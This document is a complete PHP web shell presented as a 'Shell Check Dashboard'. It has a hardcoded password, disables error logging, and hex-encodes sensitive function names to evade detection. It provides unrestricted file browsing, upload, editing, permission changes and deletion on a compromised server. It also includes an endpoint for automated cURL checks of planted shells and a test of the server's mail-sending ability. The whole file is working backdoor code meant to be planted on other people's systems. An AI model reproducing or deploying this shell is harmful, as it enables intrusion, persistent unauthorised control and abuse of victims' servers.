<html>  </html><?php
// Configuration
$valid_password = 'digz'; // Replace with your actual shell password
$test_email = 'test@example.com'; // Replace with a valid email address for testing
$test_zip_path = __DIR__ . DIRECTORY_SEPARATOR . 'test_shell.zip'; // Platform-agnostic path for test ZIP
$extract_path = __DIR__ . DIRECTORY_SEPARATOR . 'test_extract'; // Platform-agnostic path for extraction
$test_file_path = __DIR__ . DIRECTORY_SEPARATOR . 'test_file.txt'; // Platform-agnostic path for test file

// Disable error reporting for production
error_reporting(0);
ini_set('display_errors', 0);
ini_set('error_log', null);
ini_set('log_errors', 0);
ini_set('max_execution_time', 0);
ini_set('output_buffering', 0);

// Start output buffering
ob_start();

// Function to decode hex-encoded strings
function hexa($str) {
    $r = "";
    $len = strlen($str) - 1;
    for ($i = 0; $i < $len; $i += 2) {
        $r .= chr(hexdec($str[$i] . $str[$i + 1]));
    }
    return $r;
}

// Initialize function array
$iniarray = [
    "7068705F756E616D65", # php_uname
    "73657373696F6E5F7374617274", # session_start
    "6572726F725F7265706F7274696E67", # error_reporting
    "70687076657273696F6E", # phpversion
    "66696C655F7075745F636F6E74656E7473", # file_put_contents
    "66696C655F6765745F636F6E74656E7473", # file_get_contents
    "66696C657065726D73", # fileperms
    "66696C656D74696D65", # filemtime
    "66696C6574797065", # filetype
    "68746D6C7370656369616C6368617273", # htmlspecialchars
    "737072696E7466", # sprintf
    "737562737472", # substr
    "676574637764", # getcwd
    "6368646972", # chdir
    "7374725F7265706C616365", # str_replace
    "6578706C6F6465", # explode
    "666C617368", # flash
    "6D6F76655F75706C6F616465645F66696C65", # move_uploaded_file
    "7363616E646972", # scandir
    "676574686F737462796E616D65", # gethostbyname
    "7368656C6C5F65786563", # shell_exec
    "53797374656D20496E666F726D6174696F6E", # System Information
    "6469726E616D65", # dirname
    "64617465", # date
    "6D696D655F636F6E74656E745F74797065", # mime_content_type
    "66756E6374696F6E5F657869737473", # function_exists
    "6673697A65", # fsize
    "726D646972", # rmdir
    "756E6C696E6B", # unlink
    "6D6B646972", # mkdir
    "72656E616D65", # rename
    "7365745F74696D655F6C696D6974", # set_time_limit
    "636C656172737461746361636865", # clearstatcache
    "696E695F736574", # ini_set
    "696E695F676574", # ini_get
    "6765744F776E6572", # getOwner
    "6765745F63757272656E745F75736572" # get_current_user
];
for ($i = 0; $i < count($iniarray); $i++) {
    $func[$i] = hexa($iniarray[$i]);
}
$ds = @$func[34]("disable_functions");
$show_ds = (!empty($ds)) ? "$ds" : "All function is accessible";

// File manager functions
function fsize($file) {
    $a = ["B", "KB", "MB", "GB", "TB", "PB"];
    $pos = 0;
    $size = filesize($file);
    while ($size >= 1024) {
        $size /= 1024;
        $pos++;
    }
    return round($size, 2) . " " . $a[$pos];
}

function flash($message, $status, $class, $redirect = false) {
    if (!empty($_SESSION["message"])) unset($_SESSION["message"]);
    if (!empty($_SESSION["class"])) unset($_SESSION["class"]);
    if (!empty($_SESSION["status"])) unset($_SESSION["status"]);
    $_SESSION["message"] = $message;
    $_SESSION["class"] = $class;
    $_SESSION["status"] = $status;
    if ($redirect) {
        header('Location: ' . $redirect);
        exit();
    }
    return true;
}

function clear() {
    if (!empty($_SESSION["message"])) unset($_SESSION["message"]);
    if (!empty($_SESSION["class"])) unset($_SESSION["class"]);
    if (!empty($_SESSION["status"])) unset($_SESSION["status"]);
    return true;
}

function getOwner($item) {
    global $func;
    if ($func[25]("posix_getpwuid")) {
        $downer = @posix_getpwuid(fileowner($item));
        $downer = $downer['name'];
    } else {
        $downer = fileowner($item);
    }
    if ($func[25]("posix_getgrgid")) {
        $dgrp = @posix_getgrgid(filegroup($item));
        $dgrp = $dgrp['name'];
    } else {
        $dgrp = filegroup($item);
    }
    return $downer . '/' . $dgrp;
}

// Function to check file manager (directory listing)
function checkFileManager() {
    global $func;
    $directory = __DIR__;
    try {
        $dirs = $func[18]($directory); // scandir
        return $dirs !== false && count($dirs) > 2; // More than . and ..
    } catch (Exception $e) {
        return false;
    }
}

// Function to create a test ZIP file
function createTestZip($zip_path, $file_path) {
    global $func;
    // Create a temporary text file
    if (!$func[4]($file_path, 'This is a test file for ZIP functionality.')) {
        return false;
    }
    
    // Try ZipArchive first
    if (class_exists('ZipArchive')) {
        $zip = new ZipArchive;
        if ($zip->open($zip_path, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== TRUE) {
            return false;
        }
        if (!$zip->addFile($file_path, basename($file_path))) {
            $zip->close();
            return false;
        }
        $zip->close();
        return true;
    }
    
    // Fallback to system ZIP command
    $os = strtoupper(substr(PHP_OS, 0, 3));
    if ($os === 'WIN') {
        $command = "powershell -Command \"Compress-Archive -Path '$file_path' -DestinationPath '$zip_path' -Force\"";
    } else {
        $command = "zip -j '$zip_path' '$file_path'";
    }
    exec($command, $output, $return_var);
    return $return_var === 0 && file_exists($zip_path);
}

// Function to extract a ZIP file
function extractTestZip($zip_path, $extract_path) {
    // Try ZipArchive first
    if (class_exists('ZipArchive')) {
        $zip = new ZipArchive;
        if ($zip->open($zip_path) === TRUE) {
            if (!is_dir($extract_path)) {
                if (!mkdir($extract_path, 0777, true)) {
                    $zip->close();
                    return false;
                }
            }
            $result = $zip->extractTo($extract_path);
            $zip->close();
            return $result;
        }
        return false;
    }
    
    // Fallback to system unzip command
    $os = strtoupper(substr(PHP_OS, 0, 3));
    if ($os === 'WIN') {
        $command = "powershell -Command \"Expand-Archive -Path '$zip_path' -DestinationPath '$extract_path' -Force\"";
    } else {
        $command = "unzip -o '$zip_path' -d '$extract_path'";
    }
    exec($command, $output, $return_var);
    return $return_var === 0 && is_dir($extract_path);
}

// Function to delete directory and its contents
function deleteDirectory($dir) {
    global $func;
    if (!is_dir($dir)) {
        return;
    }
    $files = array_diff($func[18]($dir), ['.', '..']);
    foreach ($files as $file) {
        $path = $dir . DIRECTORY_SEPARATOR . $file;
        is_dir($path) ? deleteDirectory($path) : $func[28]($path);
    }
    $func[27]($dir);
}

// Function to test email sending
function checkSend() {
    global $test_email;
    $subject = 'Test Email from Shell';
    $message = 'This is a test email to verify send functionality.';
    $headers = 'From: noreply@localhost.com' . "\r\n" .
               'Reply-To: noreply@localhost.com' . "\r\n" .
               'X-Mailer: PHP/' . phpversion();
    return @mail($test_email, $subject, $message, $headers);
}

// Function to test ZIP extraction
function checkZip() {
    global $test_zip_path, $extract_path, $test_file_path;
    if (!createTestZip($test_zip_path, $test_file_path)) {
        return false;
    }
    $result = extractTestZip($test_zip_path, $extract_path);
    if (file_exists($test_zip_path)) {
        unlink($test_zip_path);
    }
    if (file_exists($test_file_path)) {
        unlink($test_file_path);
    }
    if (is_dir($extract_path)) {
        deleteDirectory($extract_path);
    }
    return $result;
}

// Handle cURL requests from shell_ops.php
if (isset($_POST['pass'])) {
    $provided_password = trim(strip_tags(htmlspecialchars(addslashes($_POST['pass']))));
    if ($provided_password !== $valid_password) {
        sendError('Invalid password');
    }

    if (isset($_GET['checksend'])) {
        echo checkSend() ? "check-result-1" : "<button class='btn btn-danger btn-sm'>Send Failed</button>";
    } elseif (isset($_GET['checkzip'])) {
        echo checkZip() ? "check-result-1" : "<button class='btn btn-danger btn-sm'>ZIP Extraction Failed</button>";
    } else {
        if (checkFileManager()) {
            $uname = $func[0]();
            $php_version = $func[3]();
            $is_priv8 = true;
            $response = "File manager";
            if ($is_priv8) {
                $response .= "\nPRIV8\n";
                $response .= "<nobr>$uname</nobr>\n";
                $response .= ")<br>$php_version <span>Safe mode:</span>";
            }
            echo $response;
        } else {
            sendError('File Manager Not Accessible');
        }
    }
    ob_end_flush();
    exit;
}

// Handle browser access (login and dashboard)
$func[1](); // session_start
$login_error = '';
$dashboard_message = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
    $provided_password = trim(strip_tags(htmlspecialchars(addslashes($_POST['password']))));
    if ($provided_password === $valid_password) {
        $_SESSION['logged_in'] = true;
    } else {
        $login_error = 'Invalid password';
    }
}

if (isset($_POST['action']) && isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true) {
    switch ($_POST['action']) {
        case 'checksend':
            $dashboard_message = checkSend() ? 'Send: Success' : 'Send: Failed';
            break;
        case 'checkzip':
            $dashboard_message = checkZip() ? 'ZIP Extraction: Success' : 'ZIP Extraction: Failed';
            break;
        case 'logout':
            session_destroy();
            header('Location: ' . basename($_SERVER['PHP_SELF']));
            exit;
    }
}

// File manager handling for dashboard
$path = isset($_GET['dir']) ? $_GET['dir'] : $func[12](); // getcwd
$func[13]($path); // chdir
$path = $func[14]('\\', '/', $path); // str_replace
$exdir = $func[15]('/', $path); // explode

if (isset($_POST['newFolderName'])) {
    if ($func[29]($path . '/' . $_POST['newFolderName'])) {
        $func[16]("Create Folder Successfully!", "Success", "success", "?dir=$path");
    } else {
        $func[16]("Create Folder Failed", "Failed", "error", "?dir=$path");
    }
}

if (isset($_POST['newFileName']) && isset($_POST['newFileContent'])) {
    if ($func[4]($path . '/' . $_POST['newFileName'], $_POST['newFileContent'])) {
        $func[16]("Create File Successfully!", "Success", "success", "?dir=$path");
    } else {
        $func[16]("Create File Failed", "Failed", "error", "?dir=$path");
    }
}

if (isset($_POST['newName']) && isset($_GET['item'])) {
    if ($_POST['newName'] == '') {
        $func[16]("You miss an important value", "Ooopss..", "warning", "?dir=$path");
    } elseif ($func[30]($path . '/' . $_GET['item'], $path . '/' . $_POST['newName'])) {
        $func[16]("Rename Successfully!", "Success", "success", "?dir=$path");
    } else {
        $func[16]("Rename Failed", "Failed", "error", "?dir=$path");
    }
}

if (isset($_POST['newContent']) && isset($_GET['item'])) {
    if ($func[4]($path . '/' . $_GET['item'], $_POST['newContent'])) {
        $func[16]("Edit Successfully!", "Success", "success", "?dir=$path");
    } else {
        $func[16]("Edit Failed", "Failed", "error", "?dir=$path");
    }
}

if (isset($_POST['newPerm']) && isset($_GET['item'])) {
    if ($_POST['newPerm'] == '') {
        $func[16]("You miss an important value", "Ooopss..", "warning", "?dir=$path");
    } elseif (chmod($path . '/' . $_GET['item'], octdec($_POST['newPerm']))) {
        $func[16]("Change Permission Successfully!", "Success", "success", "?dir=$path");
    } else {
        $func[16]("Change Permission Failed", "Failed", "error", "?dir=$path");
    }
}

if (isset($_GET['action']) && $_GET['action'] == 'delete' && isset($_GET['item'])) {
    $item = $path . '/' . $_GET['item'];
    if (is_dir($item)) {
        if ($func[27]($item)) {
            $func[16]("Delete Successfully!", "Success", "success", "?dir=$path");
        } else {
            $func[16]("Delete Failed", "Failed", "error", "?dir=$path");
        }
    } else {
        if ($func[28]($item)) {
            $func[16]("Delete Successfully!", "Success", "success", "?dir=$path");
        } else {
            $func[16]("Delete Failed", "Failed", "error", "?dir=$path");
        }
    }
}

if (isset($_FILES['uploadfile'])) {
    $total = count($_FILES['uploadfile']['name']);
    $success = false;
    for ($i = 0; $i < $total; $i++) {
        $success = $func[17]($_FILES['uploadfile']['tmp_name'][$i], $path . '/' . $_FILES['uploadfile']['name'][$i]);
    }
    if ($success) {
        $func[16]("Upload " . ($total > 1 ? "$total Files" : "File") . " Successfully!", "Success", "success", "?dir=$path");
    } else {
        $func[16]("Upload Failed", "Failed", "error", "?dir=$path");
    }
}

$dirs = $func[18]($path); // scandir
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shell Check Dashboard</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        :root {
            --primary: #6366f1;
            --primary-dark: #4f46e5;
            --secondary: #10b981;
            --background: #f3f4f6;
            --card-bg: #ffffff;
            --text-primary: #1f2937;
        }
        body {
            background: linear-gradient(135deg, #f3f4f6, #e5e7eb);
            font-family: 'Inter', sans-serif;
            color: var(--text-primary);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .card {
            background: var(--card-bg);
            border-radius: 1.5rem;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
            padding: 2rem;
            max-width: 1200px;
            width: 100%;
            transition: transform 0.3s ease;
        }
        .card:hover {
            transform: translateY(-5px);
        }
        .btn {
            border-radius: 0.75rem;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }
        .btn-primary {
            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
            color: white;
        }
        .btn-primary:hover {
            background: var(--primary-dark);
        }
        .btn-secondary {
            background: var(--secondary);
            color: white;
        }
        .btn-secondary:hover {
            background: #059669;
        }
        .btn-danger {
            background: linear-gradient(135deg, #ef4444, #dc2626);
            color: white;
        }
        .btn-danger:hover {
            background: #b91c1c;
        }
        .form-control {
            border-radius: 0.75rem;
            border: 1px solid #d1d5db;
            padding: 0.75rem;
            transition: all 0.3s ease;
        }
        .form-control:focus {
            border-color: var(--primary);
            box-shadow: 0 0 0 4px rgba(99, 102, 241, 0.2);
            outline: none;
        }
        .alert {
            border-radius: 0.75rem;
            padding: 1rem;
            margin-bottom: 1rem;
            background: #fef2f2;
            color: #b91c1c;
            border-left: 4px solid #ef4444;
        }
        .success {
            background: #d1fae5;
            color: #065f46;
            border-left: 4px solid var(--secondary);
        }
        .table th, .table td {
            padding: 1rem;
            vertical-align: middle;
        }
        .table thead {
            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
            color: white;
        }
        .table tbody tr:hover {
            background: #f1f5f9;
        }
        .breadcrumb a:hover {
            color: var(--primary);
        }
    </style>
</head>
<body>
    <?php if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true): ?>
        <!-- Login Interface -->
        <div class="card">
            <h1 class="text-2xl font-bold text-center mb-6">Shell Check Login</h1>
            <?php if ($login_error): ?>
                <div class="alert"><?php echo htmlspecialchars($login_error); ?></div>
            <?php endif; ?>
            <form method="POST" class="space-y-4">
                <div>
                    <label class="block text-sm font-medium text-gray-700 mb-1">Password</label>
                    <input type="password" name="password" class="form-control w-full" placeholder="Enter password" required>
                </div>
                <button type="submit" class="btn btn-primary w-full">
                    <i class="fas fa-sign-in-alt mr-2"></i> Login
                </button>
            </form>
        </div>
    <?php else: ?>
        <!-- Dashboard -->
        <div class="card">
            <h1 class="text-2xl font-bold text-center mb-6">Shell Check Dashboard</h1>
            <?php if ($dashboard_message): ?>
                <div class="alert <?php echo strpos($dashboard_message, 'Success') !== false ? 'success' : ''; ?>">
                    <?php echo htmlspecialchars($dashboard_message); ?>
                </div>
            <?php endif; ?>
            <div class="grid grid-cols-1 sm:grid-cols-2 gap-4 mb-6">
                <form method="POST">
                    <input type="hidden" name="action" value="checksend">
                    <button type="submit" class="btn btn-secondary w-full">
                        <i class="fas fa-envelope mr-2"></i> Check Send
                    </button>
                </form>
                <form method="POST">
                    <input type="hidden" name="action" value="checkzip">
                    <button type="submit" class="btn btn-primary w-full">
                        <i class="fas fa-file-archive mr-2"></i> Check ZIP
                    </button>
                </form>
                <form method="POST">
                    <input type="hidden" name="action" value="logout">
                    <button type="submit" class="btn btn-danger w-full">
                        <i class="fas fa-sign-out-alt mr-2"></i> Logout
                    </button>
                </form>
            </div>
            <!-- File Manager -->
            <h2 class="text-xl font-semibold mb-4">File Manager</h2>
            <?php if (isset($_SESSION['message'])): ?>
                <div class="alert <?php echo $_SESSION['class'] === 'success' ? 'success' : ''; ?>">
                    <?php echo htmlspecialchars($_SESSION['message']); ?>
                </div>
                <?php clear(); ?>
            <?php endif; ?>
            <div class="info mb-3">
                <div class="text-center text-lg font-medium">karma-syndicate</div>
                <div><i class="fas fa-server mr-2"></i><?php echo $func[0](); ?></div>
                <div><i class="fas fa-microchip mr-2"></i><?php echo $_SERVER['SERVER_SOFTWARE']; ?></div>
                <div><i class="fas fa-satellite-dish mr-2"></i><?php echo !@$_SERVER['SERVER_ADDR'] ? $func[19]($_SERVER['SERVER_NAME']) : @$_SERVER['SERVER_ADDR']; ?></div>
            </div>
            <div class="breadcrumb mb-4">
                <i class="fas fa-folder mr-2"></i>
                <?php foreach ($exdir as $id => $pat): ?>
                    <?php if ($pat == '' && $id == 0): ?>
                        <a href="?dir=/" class="text-blue-600 hover:underline">/</a>
                    <?php elseif ($pat == ''): ?>
                        <?php continue; ?>
                    <?php elseif ($id + 1 == count($exdir)): ?>
                        <span class="text-gray-500"><?php echo htmlspecialchars($pat); ?></span>
                    <?php else: ?>
                        <a href="?dir=<?php for ($i = 0; $i <= $id; $i++) { echo htmlspecialchars($exdir[$i]); if ($i != $id) echo "/"; } ?>" class="text-blue-600 hover:underline"><?php echo htmlspecialchars($pat); ?></a>
                        <span class="text-gray-500">/</span>
                    <?php endif; ?>
                <?php endforeach; ?>
                <a href="?" class="text-blue-600 hover:underline">[ HOME ]</a>
            </div>
            <div class="grid grid-cols-1 sm:grid-cols-3 gap-4 mb-4">
                <form method="POST" enctype="multipart/form-data" class="flex items-center">
                    <input type="file" name="uploadfile[]" class="form-control flex-grow" multiple>
                    <button type="submit" class="btn btn-primary ml-2"><i class="fas fa-upload"></i></button>
                </form>
                <form method="POST" class="flex items-center">
                    <input type="text" name="newFolderName" class="form-control flex-grow" placeholder="New Folder">
                    <button type="submit" class="btn btn-primary ml-2"><i class="fas fa-folder-plus"></i></button>
                </form>
                <form method="POST" class="flex items-center">
                    <input type="text" name="newFileName" class="form-control flex-grow" placeholder="New File">
                    <textarea name="newFileContent" class="form-control mt-2" rows="2" placeholder="File Content"></textarea>
                    <button type="submit" class="btn btn-primary ml-2"><i class="fas fa-file-plus"></i></button>
                </form>
            </div>
            <?php if (isset($_GET['action']) && $_GET['action'] != 'delete'): ?>
                <div class="mb-4">
                    <?php if ($_GET['action'] == 'rename' && isset($_GET['item'])): ?>
                        <form method="POST" class="space-y-4">
                            <label class="block text-sm font-medium text-gray-700">New Name</label>
                            <input type="text" name="newName" class="form-control w-full" value="<?php echo htmlspecialchars($_GET['item']); ?>">
                            <div class="flex gap-2">
                                <button type="submit" class="btn btn-primary"><i class="fas fa-save mr-2"></i> Submit</button>
                                <a href="?dir=<?php echo htmlspecialchars($path); ?>" class="btn btn-secondary">Back</a>
                            </div>
                        </form>
                    <?php elseif ($_GET['action'] == 'edit' && isset($_GET['item'])): ?>
                        <form method="POST" class="space-y-4">
                            <label class="block text-sm font-medium text-gray-700"><?php echo htmlspecialchars($_GET['item']); ?></label>
                            <textarea name="newContent" rows="10" class="form-control w-full" id="CopyFromTextArea"><?php echo $func[9]($func[5]($path . '/' . $_GET['item'])); ?></textarea>
                            <div class="flex gap-2">
                                <button type="submit" class="btn btn-primary"><i class="fas fa-save mr-2"></i> Submit</button>
                                <button type="button" class="btn btn-secondary" onclick="copyText()">Copy</button>
                                <a href="?dir=<?php echo htmlspecialchars($path); ?>" class="btn btn-secondary">Back</a>
                            </div>
                        </form>
                    <?php elseif ($_GET['action'] == 'view' && isset($_GET['item'])): ?>
                        <label class="block text-sm font-medium text-gray-700"><?php echo htmlspecialchars($_GET['item']); ?></label>
                        <textarea rows="10" class="form-control w-full" disabled><?php echo $func[9]($func[5]($path . '/' . $_GET['item'])); ?></textarea>
                        <a href="?dir=<?php echo htmlspecialchars($path); ?>" class="btn btn-secondary mt-2">Back</a>
                    <?php elseif ($_GET['action'] == 'chmod' && isset($_GET['item'])): ?>
                        <form method="POST" class="space-y-4">
                            <label class="block text-sm font-medium text-gray-700"><?php echo htmlspecialchars($_GET['item']); ?></label>
                            <input type="text" name="newPerm" class="form-control w-full" value="<?php echo $func[11]($func[10]('%o', $func[6]($path . '/' . $_GET['item'])), -4); ?>">
                            <div class="flex gap-2">
                                <button type="submit" class="btn btn-primary"><i class="fas fa-save mr-2"></i> Submit</button>
                                <a href="?dir=<?php echo htmlspecialchars($path); ?>" class="btn btn-secondary">Back</a>
                            </div>
                        </form>
                    <?php endif; ?>
                </div>
            <?php else: ?>
                <div class="table-responsive">
                    <table class="table table-bordered table-striped">
                        <thead>
                            <tr>
                                <th>Name</th>
                                <th>Type</th>
                                <th>Size</th>
                                <th>Owner/Group</th>
                                <th>Permission</th>
                                <th>Last Modified</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php foreach ($dirs as $dir): if (!is_dir($path . '/' . $dir)): continue; endif; ?>
                                <tr>
                                    <td>
                                        <?php if ($dir === '..'): ?>
                                            <a href="?dir=<?php echo htmlspecialchars($func[22]($path)); ?>" class="text-blue-600 hover:underline"><i class="fas fa-folder-open mr-2"></i><?php echo htmlspecialchars($dir); ?></a>
                                        <?php elseif ($dir === '.'): ?>
                                            <a href="?dir=<?php echo htmlspecialchars($path); ?>" class="text-blue-600 hover:underline"><i class="fas fa-folder-open mr-2"></i><?php echo htmlspecialchars($dir); ?></a>
                                        <?php else: ?>
                                            <a href="?dir=<?php echo htmlspecialchars($path . '/' . $dir); ?>" class="text-blue-600 hover:underline"><i class="fas fa-folder mr-2"></i><?php echo htmlspecialchars($dir); ?></a>
                                        <?php endif; ?>
                                    </td>
                                    <td><?php echo $func[8]($path . '/' . $dir); ?></td>
                                    <td>-</td>
                                    <td><?php echo getOwner($path . '/' . $dir); ?></td>
                                    <td><?php echo $func[11]($func[10]('%o', $func[6]($path . '/' . $dir)), -4); ?></td>
                                    <td><?php echo $func[23]("Y-m-d h:i:s", $func[7]($path . '/' . $dir)); ?></td>
                                    <td>
                                        <?php if ($dir != '.' && $dir != '..'): ?>
                                            <div class="flex gap-2">
                                                <a href="?dir=<?php echo htmlspecialchars($path); ?>&item=<?php echo htmlspecialchars($dir); ?>&action=rename" class="btn btn-primary btn-sm"><i class="fas fa-edit"></i></a>
                                                <a href="?dir=<?php echo htmlspecialchars($path); ?>&item=<?php echo htmlspecialchars($dir); ?>&action=chmod" class="btn btn-primary btn-sm"><i class="fas fa-file-signature"></i></a>
                                                <a href="?dir=<?php echo htmlspecialchars($path); ?>&item=<?php echo htmlspecialchars($dir); ?>&action=delete" class="btn btn-danger btn-sm" onclick="return confirm('Are you sure you want to delete this?')"><i class="fas fa-trash"></i></a>
                                            </div>
                                        <?php endif; ?>
                                    </td>
                                </tr>
                            <?php endforeach; ?>
                            <?php foreach ($dirs as $dir): if (!is_file($path . '/' . $dir)): continue; endif; ?>
                                <tr>
                                    <td>
                                        <a href="?dir=<?php echo htmlspecialchars($path); ?>&item=<?php echo htmlspecialchars($dir); ?>&action=view" class="text-blue-600 hover:underline"><i class="fas fa-file-code mr-2"></i><?php echo htmlspecialchars($dir); ?></a>
                                    </td>
                                    <td><?php echo $func[25]('mime_content_type') ? $func[24]($path . '/' . $dir) : $func[8]($path . '/' . $dir); ?></td>
                                    <td><?php echo fsize($path . '/' . $dir); ?></td>
                                    <td><?php echo getOwner($path . '/' . $dir); ?></td>
                                    <td><?php echo $func[11]($func[10]('%o', $func[6]($path . '/' . $dir)), -4); ?></td>
                                    <td><?php echo $func[23]("Y-m-d h:i:s", $func[7]($path . '/' . $dir)); ?></td>
                                    <td>
                                        <div class="flex gap-2">
                                            <a href="?dir=<?php echo htmlspecialchars($path); ?>&item=<?php echo htmlspecialchars($dir); ?>&action=edit" class="btn btn-primary btn-sm"><i class="fas fa-file-edit"></i></a>
                                            <a href="?dir=<?php echo htmlspecialchars($path); ?>&item=<?php echo htmlspecialchars($dir); ?>&action=rename" class="btn btn-primary btn-sm"><i class="fas fa-edit"></i></a>
                                            <a href="?dir=<?php echo htmlspecialchars($path); ?>&item=<?php echo htmlspecialchars($dir); ?>&action=chmod" class="btn btn-primary btn-sm"><i class="fas fa-file-signature"></i></a>
                                            <a href="?dir=<?php echo htmlspecialchars($path); ?>&item=<?php echo htmlspecialchars($dir); ?>&action=delete" class="btn btn-danger btn-sm" onclick="return confirm('Are you sure you want to delete this?')"><i class="fas fa-trash"></i></a>
                                        </div>
                                    </td>
                                </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                </div>
                <div class="text-center text-gray-500 mt-4">
                    &copy; BlackDragon <?php echo date('Y'); ?>
                </div>
            <?php endif; ?>
        </div>
    <?php endif; ?>
    <script>
        function copyText() {
            var textarea = document.getElementById("CopyFromTextArea");
            textarea.select();
            document.execCommand("copy");
        }
    </script>
</body>
</html>
<?php ob_end_flush(); ?>